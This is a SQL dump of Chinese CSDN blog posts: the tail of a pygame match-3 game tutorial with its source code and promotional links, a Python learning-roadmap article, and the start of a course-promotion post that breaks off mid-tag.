                            if self.swapGem(lex_selected_xy, lex_selected_xy2):\n                                    individual_moving = True\n                                    swap_again = False\n                                else:\n                                    lex_selected_xy = None\n            if overall_moving:\n                overall_moving = not self.dropGems(0, 0)\n                # 移动一次可能可以拼出多个3连块\n                if not overall_moving:\n                    res_match = self.isMatch()\n                    add_score = self.removeMatched(res_match)\n                    if add_score &gt; 0:\n                        overall_moving = True\n            if individual_moving:\n                lex1 = self.getGemByPos(*lex_selected_xy)\n                lex2 = self.getGemByPos(*lex_selected_xy2)\n                lex1.move()\n                lex2.move()\n                if lex1.fixed and lex2.fixed:\n                    res_match = self.isMatch()\n                    if res_match[0] == 0 and not swap_again:\n                        swap_again = True\n                        self.swapGem(lex_selected_xy, lex_selected_xy2)\n                        self.sounds[\'mismatch\'].play()\n                    else:\n                        add_score = self.removeMatched(res_match)\n                        overall_moving = True\n                        individual_moving = False\n                        lex_selected_xy = None\n                        lex_selected_xy2 = None\n            self.screen.fill((154, 206, 235))\n            self.drawGrids()\n            self.lexs_group.draw(self.screen)\n            if lex_selected_xy:\n                self.drawBlock(self.getGemByPos(*lex_selected_xy).rect)\n            if add_score:\n                if add_score_showtimes == 10:\n                    random.choice(self.sounds[\'match\']).play()\n                self.drawAddScore(add_score)\n                add_score_showtimes -= 1\n                if add_score_showtimes &lt; 1:\n                    add_score_showtimes = 10\n                    add_score = 0\n            self.remaining_time -= (int(time.time()) - time_pre)\n            time_pre = int(time.time())\n            self.showRemainingTime()\n            self.drawScore()\n            if self.remaining_time &lt;= 0:\n                return self.score\n            gamepy.display.update()\n            clock.tick(self.cfg.FPS)\n			\n    \'\'\'初始化\'\'\'\n    def reset(self):\n        # 随机生成各个块\n        while True:\n            self.all_lexs = []\n            self.lexs_group = gamepy.sprite.Group()\n            for x in range(self.cfg.NUMGRID):\n                self.all_lexs.append([])\n                for y in range(self.cfg.NUMGRID):\n                    lex = lexSprite(img_path=random.choice(self.lex_imgs), size=(self.cfg.GRIDSIZE, self.cfg.GRIDSIZE), position=[self.cfg.XMARGIN+x*self.cfg.GRIDSIZE, self.cfg.YMARGIN+y*self.cfg.GRIDSIZE-self.cfg.NUMGRID*self.cfg.GRIDSIZE], downlen=self.cfg.NUMGRID*self.cfg.GRIDSIZE)\n                    self.all_lexs[x].append(lex)\n                    self.lexs_group.add(lex)\n            if self.isMatch()[0] == 0:\n                break\n        # 得分\n        self.score = 0\n        # 拼出一个的奖励\n        self.reward = 10\n        # 时间\n        self.remaining_time = 300\n    \'\'\'显示剩余时间\'\'\'\n    def showRemainingTime(self):\n        remaining_time_render = self.font.render(\'CountDown: %ss\' % str(self.remaining_time), 1, (85, 65, 0))\n        rect = remaining_time_render.get_rect()\n        rect.left, rect.top = (self.cfg.SCREENSIZE[0]-201, 6)\n        self.screen.blit(remaining_time_render, rect)\n    \'\'\'显示得分\'\'\'\n    def drawScore(self):\n        score_render = self.font.render(\'SCORE:\'+str(self.score), 1, (85, 65, 0))\n        rect = score_render.get_rect()\n        rect.left, rect.top = (10, 6)\n        self.screen.blit(score_render, rect)\n    \'\'\'显示加分\'\'\'\n    def drawAddScore(self, add_score):\n        score_render = self.font.render(\'+\'+str(add_score), 1, (255, 99, 99))\n        rect = score_render.get_rect()\n        rect.left, rect.top = (250, 250)\n        self.screen.blit(score_render, rect)\n    \'\'\'生成新的 块\'\'\'\n    def generateNewGems(self, res_match):\n        if res_match[0] == 1:\n            start = res_match[2]\n            while start &gt; -2:\n                for each in [res_match[1], res_match[1]+1, res_match[1]+2]:\n                    lex = self.getGemByPos(*[each, start])\n                    if start == res_match[2]:\n                        self.lexs_group.remove(lex)\n                        self.all_lexs[each][start] = None\n                    elif start &gt;= 0:\n                        lex.target_y += self.cfg.GRIDSIZE\n                        lex.fixed = False\n                        lex.direction = \'down\'\n                        self.all_lexs[each][start+1] = lex\n                    else:\n                        lex = lexSprite(img_path=random.choice(self.lex_imgs), size=(self.cfg.GRIDSIZE, self.cfg.GRIDSIZE), position=[self.cfg.XMARGIN+each*self.cfg.GRIDSIZE, self.cfg.YMARGIN-self.cfg.GRIDSIZE], downlen=self.cfg.GRIDSIZE)\n                        self.lexs_group.add(lex)\n                        self.all_lexs[each][start+1] = lex\n                start -= 1\n        elif res_match[0] == 2:\n            start = res_match[2]\n            while start &gt; -4:\n                if start == res_match[2]:\n                    for each in range(0, 3):\n                        lex = self.getGemByPos(*[res_match[1], start+each])\n                        self.lexs_group.remove(lex)\n                        self.all_lexs[res_match[1]][start+each] = None\n                elif start &gt;= 0:\n                    lex = self.getGemByPos(*[res_match[1], start])\n                    lex.target_y += self.cfg.GRIDSIZE * 3\n                    lex.fixed = False\n                    lex.direction = \'down\'\n                    self.all_lexs[res_match[1]][start+3] = lex\n                else:\n                    lex = lexSprite(img_path=random.choice(self.lex_imgs), size=(self.cfg.GRIDSIZE, self.cfg.GRIDSIZE), position=[self.cfg.XMARGIN+res_match[1]*self.cfg.GRIDSIZE, self.cfg.YMARGIN+start*self.cfg.GRIDSIZE], downlen=self.cfg.GRIDSIZE*3)\n                    self.lexs_group.add(lex)\n                    self.all_lexs[res_match[1]][start+3] = lex\n                start -= 1\n    \'\'\'移除匹配的lex\'\'\'\n    def removeMatched(self, res_match):\n        if res_match[0] &gt; 0:\n            self.generateNewGems(res_match)\n            self.score += self.reward\n            return self.reward\n        return 0\n    \'\'\' 界面的网格绘制\'\'\'\n    def drawGrids(self):\n        for x in range(self.cfg.NUMGRID):\n            for y in range(self.cfg.NUMGRID):\n                rect = gamepy.Rect((self.cfg.XMARGIN+x*self.cfg.GRIDSIZE, self.cfg.YMARGIN+y*self.cfg.GRIDSIZE, self.cfg.GRIDSIZE, self.cfg.GRIDSIZE))\n                self.drawBlock(rect, color=(0, 0, 255), size=1)\n    \'\'\'画矩形block框\'\'\'\n    def drawBlock(self, block, color=(255, 0, 255), size=4):\n        gamepy.draw.rect(self.screen, color, block, size)\n    \'\'\'下落特效\'\'\'\n    def dropGems(self, x, y):\n        if not self.getGemByPos(x, y).fixed:\n            self.getGemByPos(x, y).move()\n        if x &lt; self.cfg.NUMGRID - 1:\n            x += 1\n            return self.dropGems(x, y)\n        elif y &lt; self.cfg.NUMGRID - 1:\n            x = 0\n            y += 1\n            return self.dropGems(x, y)\n        else:\n            return self.isFull()\n    \'\'\'是否每个位置都有 块了\'\'\'\n    def isFull(self):\n        for x in range(self.cfg.NUMGRID):\n            for y in range(self.cfg.NUMGRID):\n                if not self.getGemByPos(x, y).fixed:\n                    return False\n        return True\n    \'\'\'检查有无 块被选中\'\'\'\n    def checkSelected(self, position):\n        for x in range(self.cfg.NUMGRID):\n            for y in range(self.cfg.NUMGRID):\n                if self.getGemByPos(x, y).rect.collidepoint(*position):\n                    return [x, y]\n        return None\n    \'\'\'是否有连续一样的三个块(无--返回0/水平--返回1/竖直--返回2)\'\'\'\n    def isMatch(self):\n        for x in range(self.cfg.NUMGRID):\n            for y in range(self.cfg.NUMGRID):\n                if x + 2 &lt; self.cfg.NUMGRID:\n                    if self.getGemByPos(x, y).type == self.getGemByPos(x+1, y).type == self.getGemByPos(x+2, y).type:\n                        return [1, x, y]\n                if y + 2 &lt; self.cfg.NUMGRID:\n                    if self.getGemByPos(x, y).type == self.getGemByPos(x, y+1).type == self.getGemByPos(x, y+2).type:\n                        return [2, x, y]\n        return [0, x, y]\n    \'\'\'根据坐标获取对应位置的 对象\'\'\'\n    def getGemByPos(self, x, y):\n        return self.all_lexs[x][y]\n    \'\'\'交换 \'\'\'\n    def swapGem(self, lex1_pos, lex2_pos):\n        margin = lex1_pos[0] - lex2_pos[0] + lex1_pos[1] - lex2_pos[1]\n        if abs(margin) != 1:\n            return False\n        lex1 = self.getGemByPos(*lex1_pos)\n        lex2 = self.getGemByPos(*lex2_pos)\n        if lex1_pos[0] - lex2_pos[0] == 1:\n            lex1.direction = \'left\'\n            lex2.direction = \'right\'\n        elif lex1_pos[0] - lex2_pos[0] == -1:\n            lex2.direction = \'left\'\n            lex1.direction = \'right\'\n        elif lex1_pos[1] - lex2_pos[1] == 1:\n            lex1.direction = \'up\'\n            lex2.direction = \'down\'\n        elif lex1_pos[1] - lex2_pos[1] == -1:\n            lex2.direction = \'up\'\n            lex1.direction = \'down\'\n        lex1.target_x = lex2.rect.left\n        lex1.target_y = lex2.rect.top\n        lex1.fixed = False\n        lex2.target_x = lex1.rect.left\n        lex2.target_y = lex1.rect.top\n        lex2.fixed = False\n        self.all_lexs[lex2_pos[0]][lex2_pos[1]] = lex1\n        self.all_lexs[lex1_pos[0]][lex1_pos[1]] = lex2\n        return True\n    \'\'\'info\'\'\'\n    def __repr__(self):\n        return self.info</code></pre> \n <p></p> \n <h2 id=\"%E5%9B%9B%E3%80%81%E6%B8%B8%E6%88%8F%E5%90%AF%E5%8A%A8%E6%96%B9%E6%B3%95\">四、如何启动游戏</h2> \n <h3 id=\"1%E3%80%81%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7%E5%90%AF%E5%8A%A8\">1、开发工具</h3> \n <p>如果你有配置了工具的环境VScode、sublimeText、notepad+、pycharm什么的，可以直接在工具中，运行游戏。</p> \n <p>如果没配置，可以使用命令启动。</p> \n <h3 id=\"2%E3%80%81%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%90%AF%E5%8A%A8%20gif\">2、命令行</h3> \n <p><img alt=\"\" height=\"683\" src=\"https://img-blog.csdnimg.cn/20210418135242198.gif\" width=\"753\"></p> \n <h2></h2> \n <h2>【两种方法获取完整源码】</h2> \n <h3>1、资源下载：【pygame开发实战开发30例 完整源码】</h3> \n <p><a href=\"https://download.csdn.net/download/weixin_42350212/15836285\">https://download.csdn.net/download/weixin_42350212/15836285</a></p> \n <h3><strong>2、订阅专栏：【获取完整源码+教程】</strong></h3> \n <p id=\"%E4%B8%80%E8%B5%B7%E6%9D%A5%E5%AD%A6pygame%E5%90%A7%20%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%9130%E4%BE%8B%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E5%A1%94%E9%98%B2%E6%B8%B8%E6%88%8F%20%E4%B8%A8%E8%93%84%E5%8A%9B%E8%AE%A1%E5%88%92\"><strong><a href=\"https://lexsaints.blog.csdn.net/article/details/115672270\">一起来学pygame吧 游戏开发30例（二）——塔防游戏</a></strong></p> \n <p id=\"%E4%B8%80%E8%B5%B7%E6%9D%A5%E5%AD%A6pygame%E5%90%A7%20%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%9130%E4%BE%8B%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97%E5%B0%8F%E6%B8%B8%E6%88%8F%20%E4%B8%A8%E8%93%84%E5%8A%9B%E8%AE%A1%E5%88%92\"><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115699489\">一起来学pygame吧 游戏开发30例（四）——俄罗斯方块小游戏 </a></strong></p> \n <p></p> \n <h2>推荐阅读</h2> \n <p><strong>python实战</strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/117031929\">【python实战】</a><a href=\"https://blog.csdn.net/weixin_42350212/article/details/117260497\">前女友婚礼，python破解婚礼现场的WIFI，把名称改成了</a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/117031929\">【python实战】前女友发来加密的 “520快乐.pdf“，我用python破解开之后，却发现</a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/116936268\">【python实战】昨晚，我用python帮隔壁小姐姐P证件照 自拍，然后发现</a>...</strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/116568510\">【python实战】女友半夜加班发自拍 python男友用30行代码发现惊天秘密</a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115399658\">【python实战】python你TM太皮了——区区30行代码就能记录键盘的一举一动</a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115580004\">【</a><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115399658\">python</a><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115580004\">实战】女神相册密码忘记了，我只用Python写了20行代码~~~</a></strong></p> \n <p><strong>pygame系列文章【订阅专栏，获取完整源码】</strong></p> \n <p><strong><a href=\"https://lexsaints.blog.csdn.net/article/details/115672270\">一起来学pygame吧 游戏开发30例（二）——塔防游戏</a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115699489\">一起来学pygame吧 游戏开发30例（四）——俄罗斯方块小游戏 </a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/category_7716334.html\">渗透测试实战专栏</a></strong></p> \n <p><strong><a name=\"t15\"></a><a href=\"https://blog.csdn.net/weixin_42350212/category_10959170.html\">Windows AD/Exchange管理专栏</a></strong></p> \n <p><strong><a name=\"t16\"></a><a href=\"https://blog.csdn.net/weixin_42350212/category_10959215.html\">Linux高性能服务器搭建</a>&nbsp;</strong></p> \n <p><strong><a name=\"t17\"></a><a href=\"https://blog.csdn.net/weixin_42350212/category_10649706.html\">PowerShell自动化专栏</a></strong></p> \n <p></p> \n <h3><span style=\"color:#fe2c24;\">CSDN官方学习推荐 ↓ ↓ ↓</span></h3> \n <p><strong>CSDN出的Python全栈知识图谱，太强了，推荐给大家！</strong></p> \n <p><img alt=\"\" height=\"615\" src=\"https://img-blog.csdnimg.cn/20210607120133619.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"345\">&nbsp;​</p> \n <p></p> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (81, 'Python所有方向的学习路线，你们要的知识体系在这，千万别做了无用功！', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-light\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <h2><a id=\"_0\"></a>前言</h2> \n <p>一直以来都有很多想学习Python的朋友们问我，学Python怎么学？爬虫和数据分析怎么学？web开发的学习路线能教教我吗？</p> \n <p>我先告诉大家一个点，<strong>不管你是报了什么培训班，还是自己在通过各种渠道自学，你一定要注重一个东西：完整的知识体系。</strong></p> \n <p>感觉很迷茫？学了一段时间还是不入流？很大一部分原因是因为你没有一个完整的知识体系，你不知道自己现在的进度、未来的方向。</p> \n <p>端午三天，虽然回了乡下，但还是抽时间去做了Python所有方向的学习路线，今天分享给大家。</p> \n <hr> \n <h2><a id=\"Python_10\"></a>一、Python入门</h2> \n <p>初学者都会比较好奇，学了这么久Python，什么程度才叫入门了呢？</p> \n <p>每个人对技术的认知都不尽相同，在我个人看来，你学完以下这些东西就可以算是入门了，为什么？因为以下这些东西是Python进阶各个方向都必备的基础知识，你进阶去学爬虫或者web开发等方向，你都得先学会它们。</p> \n <p>因为知识点放在一起比较多，我把它们稍加区分成基础和高级编程两块，对于每一个自学的人，按照这个体系去打好基础，你未来的路会走得更稳重。</p> \n <p><strong>适用人群：零基础/基础不扎实者，学Python都从这里开始</strong></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615151249871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poaWd1aWd1,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br> <img src=\"https://img-blog.csdnimg.cn/2021061515130858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poaWd1aWd1,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h2><a id=\"_24\"></a>二、爬虫</h2> \n <p>爬虫作为一个热门的方向，不管是在自己兼职还是当成辅助技能提高工作效率，都是很不错的选择，当然了，还有一些以此为主职业的爬虫工程师。</p> \n <p>那么爬虫怎么学习才能成体系？中级水平的爬虫所需要的东西不是很多，参考这个体系去学习，如果能掌握90%,你可以很自信地说你已经精通爬虫。</p> \n <p><strong>适用人群：爬虫方向/数据分析方向/非程序员加薪</strong><br> <img src=\"https://img-blog.csdnimg.cn/20210615151745684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poaWd1aWd1,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h2><a id=\"_34\"></a>三、数据分析</h2> \n <p>谁都知道数据是这个时代最为宝贵的东西，但有一个前提就是，你拿到的数据你得懂，一切发挥不出应有功效的数据都是垃圾数据。</p> \n <p>数据分析的使命就是发挥数据应有的作用：直接作用和间接作用。</p> \n <p>如果你是从事大数据相关工作的IT人士，我建议你掌握但不要止步于下面的数据体系，不要以为会了Numpy、Pandas、Matplotlib就是会了数据分析，真正强大的东西还在后面。</p> \n <p>如果你是把数据分析当成一个辅助技能，那么学完下面这些就差不多，它们能满足你大多数的需求。有些小伙伴可能还是非计算机专业且从事非IT类的工作，比如说运营之类的岗位，那么我建议大家学Python入门+爬虫+数据分析就可以了，它们足以提升你在职场的工作效率，不用去全栈、测试等方向浪费时间，对你没什么大的帮助。</p> \n <p><strong>适用人群：爬虫方向/数据分析方向/非程序员加薪</strong><br> <img src=\"https://img-blog.csdnimg.cn/20210615152348547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poaWd1aWd1,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h2><a id=\"web_47\"></a>四、web开发（前/后端）</h2> \n <p>web开发是程序员职业中的热门，目前来讲，人才缺口依然很大。web开发分为前端、后端、全栈3个方向，目前国内主流的还是前后端分离，前端主要考虑用户体验，后端主要考虑底层业务逻辑、平台稳定和性能，最主要是要看你想做哪一部分？你是喜欢做用户看得见的部分，还是考虑用户看不见的部分。</p> \n <p>至于全栈，舆论一直很大，褒贬不一，我的建议是如果时间和精力允许，在技术上追求更全面是不会错的。</p> \n <p><strong>适用人群：前端/后端/全栈工程师</strong><br> <img src=\"https://img-blog.csdnimg.cn/20210615161920824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poaWd1aWd1,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br> <img src=\"https://img-blog.csdnimg.cn/20210615161941788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poaWd1aWd1,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h2><a id=\"_57\"></a>五、自动化测试</h2> \n <p>自动化测试已是未来的一种趋势，现在很多的企业都要求程序员具备自动化测试的能力，而对于自动化测试这个领域来讲，Python是目前最合适的语言。</p> \n <p><strong>适用人群：程序员/测试工程师</strong><br> <img src=\"https://img-blog.csdnimg.cn/20210615162709644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poaWd1aWd1,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h2><a id=\"_67\"></a>六、机器学习</h2> \n <p>机器学习是通往人工智能的必经之路，难度也比前面的大很多，与算法打交道是家常便饭，高付出也会带来高回报，薪资待遇很不错。虽然Python在这方面确实很强，但提醒大家一点，这个领域的门槛比较高，本科生基本无缘，建议上了硕士以上学历再考虑进入这个行业。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615163139129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poaWd1aWd1,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h2><a id=\"_74\"></a>寄语</h2> \n <p>上面就是Python所有方向的学习路线了，把你感兴趣的方向掌握了90%之后，你去找工作不是什么问题的。</p> \n <p>有些细心的朋友可能会发现，我没放人工智能的学习路线。说实在的，人工智能比机器学习要广泛很多，它已经不是某一门语言就能单独完成的事情了，所以这里不做推荐。</p> \n <p>同样的，网络安全工程师我也没有放进去谈，虽然Python也能做网络安全方面的事情，但对于一个成熟的网络安全工程师甚至红、H客而言，你需要精通的语言可不止1门而已了，又或者说，这已经不是语言工具层面的问题了。</p> \n <p>那么，祝大家在学习的路上，学有所成。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210511152217670.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poaWd1aWd1,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p>不知不觉已经破了2万粉了，一如既往地送你们东西，干货主要有：</p> \n <p>①　2000多本Python电子书（主流和经典的书籍应该都有了）</p> \n <p>②　Python标准库资料（最全中文版）</p> \n <p>③　项目源码（四五十个有趣且经典的练手项目及源码）</p> \n <p>④　Python基础入门、爬虫、web开发、大数据分析方面的视频（适合小白学习）</p> \n <p>⑤ Python学习路线图（告别不入流的学习）</p> \n <p><strong>如果你用得到的话可以直接拿走，在我的QQ技术交流群里（技术交流和资源共享，广告进来腿给你打断）可以自助拿走，群号是553274211。</strong></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210511152327755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poaWd1aWd1,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (82, '7套干货，Python常用技术学习知识图谱！！（史上最全，建议收藏）', '<div id=\"content_views\" class=\"htmledit_views\"> \n <blockquote> \n  <p>大家好，我是明月十四桥！</p> \n  <p><strong>你要偷偷努力，然后惊艳所有人~</strong></p> \n  <p><br> 给大家推荐 7 个宝藏级教程，视频课是永久有效的，可以随时学习，有几门课程还有<strong>CSDN官方学习答疑群</strong>，课程右边扫码入群，讲师在群里答疑哈~</p> \n </blockquote> \n <p id=\"main-toc\"><strong>目录</strong></p> \n <p id=\"%E4%B8%80%E3%80%81Python%E5%85%A5%E9%97%A8-toc\" style=\"margin-left:80px;\"><a href=\"#%E4%B8%80%E3%80%81Python%E5%85%A5%E9%97%A8\">一、Python数据分析</a></p> \n <p id=\"%E4%B8%89%E3%80%81Python%E7%88%AC%E8%99%AB-toc\" style=\"margin-left:80px;\"><a href=\"#%E4%B8%89%E3%80%81Python%E7%88%AC%E8%99%AB\">二、Python爬虫</a></p> \n <p id=\"%E5%9B%9B%E3%80%81Python%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB-toc\" style=\"margin-left:80px;\"><a href=\"#%E5%9B%9B%E3%80%81Python%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB\">三、Python学习技术问题汇总</a></p> \n <p id=\"%E4%BA%94%E3%80%81%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95-toc\" style=\"margin-left:80px;\"><a href=\"#%E4%BA%94%E3%80%81%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95\">四、数据结构与算法</a></p> \n <p id=\"%E5%85%AD%E3%80%81%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-toc\" style=\"margin-left:80px;\"><a href=\"#%E5%85%AD%E3%80%81%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80\">五、计算机基础</a></p> \n <p style=\"margin-left:80px;\"><a href=\"#%E4%B8%80%E3%80%81Python%E5%85%A5%E9%97%A8\">六、Python入门</a></p> \n <p id=\"%E4%B8%83%E3%80%81MySQL-toc\" style=\"margin-left:80px;\"><a href=\"#%E4%B8%83%E3%80%81MySQL\">七、MySQL</a></p> \n <hr id=\"hr-toc\"> \n <h3 id=\"%E4%B8%80%E3%80%81Python%E5%85%A5%E9%97%A8\"><strong>一、Python数据分析</strong></h3> \n <p>数据分析是Python应用较多的一个领域，这个教程包含了<strong>Python基础、数据采集、数据处理到数据挖掘</strong>，这是我看过比较细致的教程了。</p> \n <p>主要讲解了4个领域的经典项目，每一个项目都是遵从数据分析的5大步骤，<strong>商业目标建立→数据获取→数据预处理→建立模型→模型发布</strong>，你可以掌握商业项目的分析方法论。</p> \n <p><strong>【你将收获】</strong></p> \n <ol>\n  <li>熟练掌握Python相关语法知识</li>\n  <li>熟练掌握数据分析和挖掘的相关知识</li>\n  <li>提高数据处理能力，在项目中能够事半功倍</li>\n  <li>在实际项目中，运用数据挖掘相关算法解决问题</li>\n </ol> \n <p><strong>【适用人群】</strong></p> \n <ol>\n  <li>零基础学员或者有一定基础学员、大中院校学生</li>\n  <li>在职从事数据分析相关工作以及打算转行Python数据分析和挖掘相关人员</li>\n  <li>对Python以及数据分析和挖掘有兴趣人群</li>\n </ol> \n <p><img alt=\"\" height=\"599\" src=\"https://img-blog.csdnimg.cn/20210615132730699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTAzMjAxOQ==,size_16,color_FFFFFF,t_70\" width=\"1043\"></p> \n <p><img alt=\"\" height=\"458\" src=\"https://img-blog.csdnimg.cn/2021061512053144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTAzMjAxOQ==,size_16,color_FFFFFF,t_70\" width=\"914\"></p> \n <p><span style=\"color:#f33b45;\"><strong>教程传送门</strong></span>：<strong><a href=\"https://marketing.csdn.net/u/weixin_39032019/e/3781\">Python数据分析与挖掘</a></strong></p> \n <p>&nbsp;</p> \n <h3 id=\"%E4%B8%89%E3%80%81Python%E7%88%AC%E8%99%AB\"><strong>二、Python爬虫</strong></h3> \n <p>爬虫几乎是所有Python工程师都会的，这篇教程详细讲了网络爬虫的<strong>三大基本步骤（网络请求、数据解析、数据存储）</strong>。另外还有<strong>反爬操作</strong>，比如，我们经常容易遇到被反爬虫，比如字体反爬、IP识别、验证码等。</p> \n <p><strong>7大章节、150+节课程：</strong></p> \n <p><img alt=\"\" height=\"346\" src=\"https://img-blog.csdnimg.cn/20210615133733201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTAzMjAxOQ==,size_16,color_FFFFFF,t_70\" width=\"1119\"></p> \n <p>课程展示：</p> \n <p><img alt=\"\" height=\"414\" src=\"https://img-blog.csdnimg.cn/20210615120753693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTAzMjAxOQ==,size_16,color_FFFFFF,t_70\" width=\"897\"></p> \n <p><img alt=\"\" height=\"765\" src=\"https://img-blog.csdnimg.cn/20210615133538542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTAzMjAxOQ==,size_16,color_FFFFFF,t_70\" width=\"1122\"></p> \n <p><span style=\"color:#f33b45;\"><strong>教程传送门</strong></span>：<strong><a href=\"https://marketing.csdn.net/u/weixin_39032019/e/3782\">150讲轻松搞定Python网络爬虫</a></strong></p> \n <p>&nbsp;</p> \n <h3 id=\"%E5%9B%9B%E3%80%81Python%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB\">三、Python学习技术问题汇总</h3> \n <p><strong>【</strong><strong>你将收获</strong><strong>】</strong></p> \n <ul>\n  <li>学习Python中的核心技术</li>\n  <li>学习Python面试的问题和解答</li>\n  <li>学习在其他书本中没有的Python知识</li>\n </ul> \n <p><strong>【适用人群】</strong></p> \n <p>Python程序员，在校大学生</p> \n <p><strong>【课程介绍】</strong></p> \n <p>本课程是李宁老师结合十多年Python教学和开发经验的结晶。本系列课程中涉及到的知识点<strong>都是在实际工作中遇到的</strong>，并且已经解决的各种问题。还有的技术问题是搜集了国内外程序员遇到的各种类型的技术问题，部分和这些程序员直接交流，了解他们的需求以及某些理解上的困难。&nbsp;</p> \n <p>&nbsp;</p> \n <p>通过手机和总结这些技术问题，并给出多种可能的解答，将<strong>非常有助于Python程序员解决在实际工作中遇到的各种问题</strong>。</p> \n <p><img alt=\"\" height=\"476\" 